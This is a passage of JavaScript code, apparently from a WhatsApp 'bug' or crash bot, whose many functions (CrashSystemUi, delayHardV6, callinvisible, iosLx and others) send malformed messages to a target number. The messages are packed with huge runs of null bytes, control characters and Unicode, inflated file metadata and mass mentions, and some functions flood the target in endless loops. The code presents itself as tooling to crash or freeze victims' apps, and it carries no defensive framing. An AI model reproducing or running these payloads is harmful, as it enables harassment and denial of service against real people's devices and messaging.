              { name: "wa_payment_fbpin_reset", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "catalog_message", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "payment_info", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "review_order", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "send_location", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "payments_care_csat", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "view_product", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "payment_settings", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "address_message", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "automated_greeting_message_view_catalog", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "open_webview", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "message_with_link_status", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "payment_status", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "galaxy_costum", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "extensions_message_v2", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "landline_call", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "mpm", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "cta_copy", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "cta_url", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "review_and_pay", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "galaxy_message", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "cta_call", buttonParamsJson: "\u0003".repeat(9999) }
            ]
          },
          contextInfo: {
            remoteJid: "K",
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 9999 }, () => ({
                "\0": "\0"
              }))
            }
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
    await sleep(200);
}

async function Delayin(sock, target) {
    let k = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let z = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        k.message,
        {
            messageId: k.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        z.message,
        {
            messageId: z.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function CrashSystemUi(sock, target) {
    const payload1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "𝐹𝑎𝑛𝑡𝑧𝑦 𝐾𝑖𝑙𝑙 𝑌𝑜𝑢😹" + "ꦾ".repeat(55000), 
                    },
                    footer: {
                        text: "𝐹𝑎𝑛𝑡𝑧𝑦 𝐾𝑖𝑙𝑙 𝑌𝑜𝑢 𝑃ℎ𝑜𝑛𝑒😹" + "ꦽ".repeat(55000), 
                    },
                    nativeFlowMessage: {
                        messageParamsJson: ")}".repeat(5000), 
                        buttons: [
                            { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
                            { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
                            { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
                        ],
                    }
                }
            }
        }
    };
    const payload2 = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "9999999999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "⎋HADES",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "𝐹𝑎𝑛𝑡𝑧𝑦 𝑁𝑖ℎ 𝐷𝑒𝑘😈" ,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    };
    try {
        await sock.relayMessage(target, payload1, { participant: { jid: target } });
        await sock.relayMessage(target, payload2, { participant: { jid: target } });
    } catch (err) {
    }
}

async function delayHardCuy(sock, target) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}

async function delayHardV11(sock, target) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}

async function crasHidd(sock, target) {
  await sock.relayMessage(target, {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  }, { participant: { jid: target }});
}


async function panjikeren(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "panji nih"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_status",
                 ParamsJson: "\u0003".repeat(90000),
               },
             ],
           },
         },
       }, { participant: { jid: target }});
     }

async function JawaTimurForcloseNoClick(sock, target) {
  try {
    const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "XRyyPengenNenen",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});

    console.log(`Allhamdulillah Kekirim${target}`);

  } catch (error) {
    console.error(`Error${error.message}`);
  }
}

async function delayHardV6(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"+9999999999\",\"building_name\":\"ampos\",\"address\":\"/MakLo\",\"tower_number\":\"987\",\"city\":\"MakLo\",\"name\":\"CRB\",\"phone_number\":\"+888888888888\",\"house_number\":\"99\",\"floor_number\":\"99\",\"state\":\"${"\u0000".repeat(5000)}\"}}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, n) => ({
              participant: `62${n + 829599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}

async function sedotTempek(target) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"/MakLo\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"SYNC\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(1045000)}\"}}`,
          version: 3
        },
      },
    },
  },
}, { participant: { jid: target }});
}

async function Frezeepeler(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "Kenal Panji Gak?"
            },
            nativeFlowMessage: {
              buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "𑇂𑆵𑆴𑆿".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});
}

async function BlankXDelay(sock, target) {
  try {
    const XT =  'ꦾ'.repeat(10000);
    const Apo = 'ꦾ'.repeat(10000);
    const Code = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363426778009391@newsletter",
        newsletterName: "Xevo" + "ꦾ".repeat(20000),
        caption: "Fantzy Nih" + XT + Apo +  "ꦾ".repeat(75000),
        inviteExpiration: "90000",
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
        },
      },
    };

    const Mbg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Fantzy Peler",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson:
                `{"values":{"in_pin_code":"999999999999","building_name":"saosinx","landmark_area":"X","address":"rapeng","tower_number":"@maklo","city":"japanese","name":"exotics","phone_number":"999999999999","house_number":"xxx","floor_number":"xxx","state":"bokep | ${"\u0000".repeat(1045000)}"}}`,
              version: 3,
            },
            contextInfo: {
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 2,
                  expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
                },
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(target, Code, { participant: { jid: target } });
    await sock.relayMessage(target, Mbg, { participant: { jid: target } });
  } catch {}
}

async function ofmcrl(sock, target) {
  const imageMessage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  }

  let cards = [];
  for (let z = 0; z < 600; z++) {
    cards.push({
      header: {
        imageMessage,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    })
  }
  let msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\0" },
          carouselMessage: {
            cards
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid:target }
  });
}

async function xsdrHard(sock, target) {
    const xasador = {
        groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(250000),
              format: "DEFAULT.xsr",
            },
            nativeFlowResponseMessage: {
              buttons: [
                {
                  name: "flow_cta_xsr",
                  buttonParamsJson: JSON.stringify({
                    paramsJson: `{"flow_cta":"${"\u0000".repeat(90000)}"}`,
                    entryPointConversionSource: "call_permission_request",
                    version: 3
                  })
                }
              ]
            }
          }
        }
      }
    };

await sock.relayMessage(target, xasador, { participant: { jid: target } });
}


async function jirDelayHardWak(sock, target) {
  await sock.relayMessage(
    target,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " kelra - execute ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "KELRA_MESSAGE",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function stcinvisiblefinix(sock, target){
  const message = {
  "groupStatusMessageV2": {
    "message": {
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        "fileLength": "10610",
        "mediaKeyTimestamp": "1775044724",
        "stickerSentTs": "1775044724091"
      }
    }
  }
}

  return await sock.relayMessage(target, message, {})
}

async function maklo(sock, target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "123456789@newsletter",
      inviteCode: "𑜦𑜠".repeat(120000),
      inviteExpiration: 99999999999,
      newsletterName: "ោ៝" + "ꦾ".repeat(120000),
      body: {
        text: "janji ga blank" + "ી".repeat(120000)
      },
    },
  };

    await sock.relayMessage(target, msg, { });

  }
  
async function callinvisible(sock, target) {
  for (let i = 0; i < 1000; i++) {
    while (true) {
      for (let j = 0; j < 1000; j++) {
        const msg = await generateWAMessageFromContent(target, {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "kelra - execute",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\u0000".repeat(1),
                  version: 3
                }
              },
              contextInfo: {
                participant: { jid: target },
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1 }, () =>
                    `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                  )
                ]
              }
            }
          }
        }, {});

        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [target],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    {
                      tag: "to",
                      attrs: {
                        jid: target
                      },
                      content: undefined
                    }
                  ]
                }
              ]
            }
          ]
        });
      }

      await new Promise(res => setTimeout(res, 3000));
    }
  }
}  
  
async function StickerFC(sock, target) {
  const message = {
  "groupStatusMessageV2": {
    "message": {
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        "fileLength": "10610",
        "mediaKeyTimestamp": "1775044724",
        "stickerSentTs": "1775044724091"
      }
    }
  }
}

  return await sock.relayMessage(target, message, {})
}
  
async function iosLx(sock, target) {
console.log(chalk.red(`𝗥𝗲𝘃𝗲𝗻𝗴𝗲𝗿𝘀 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
for (let i = 0; i <= 10; i++) {  
  const [janda1, janda2] = await Promise.all([
    sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            locationMessage: {
              degreesLatitude: 21.1266,
              degreesLongitude: -11.8199,
              name: "Ⰶ⃟꙰。⨶𝙍𝙀𝙑𝙀𝙉𝙂𝙀𝙍𝙎 𝙄𝙈 𝙃𝙀𝙍𝙀⧃" + "𑇂𑆵𑆴𑆿".repeat(60000),
              url: "https://t.me/fantzy_reals13",
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 1900 },
                  (_, i) => `628${i + 1}@s.whatsapp.net`
                ),
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                    mediaType: "IMAGE",
